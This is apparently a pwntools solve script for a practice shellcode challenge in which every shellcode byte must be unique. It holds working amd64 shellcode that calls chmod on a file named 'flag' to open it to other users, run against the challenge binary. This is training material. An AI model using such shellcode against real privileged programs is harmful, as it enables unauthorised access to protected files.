'''
    puts("This challenge requires that every byte in your shellcode is unique!\n");
    unsigned char present[256] = {0};
    for (int i = 0; i < shellcode_size; i++)
    {
        if (present[((uint8_t *)shellcode)[i]])
        {
            printf("Failed filter at byte %d!\n", i);
            exit(1);
        }
        present[((uint8_t *)shellcode)[i]] = 1;
    }

--> Our shell code does not contain NULL bytes
'''

from pwn import *

p = process('/challenge/babyshell-level-12', aslr=False)
context.update(arch="amd64")

flag = b'flag'[::-1].hex()

shellcode = asm(f'''
push 0x{flag}
push rsp
pop rdi

mov sil, 6

push 0x5a
pop rax
syscall
''')

print(f"Shellcode length: {len(shellcode)} bytes")

p.send(shellcode)
p.interactive()
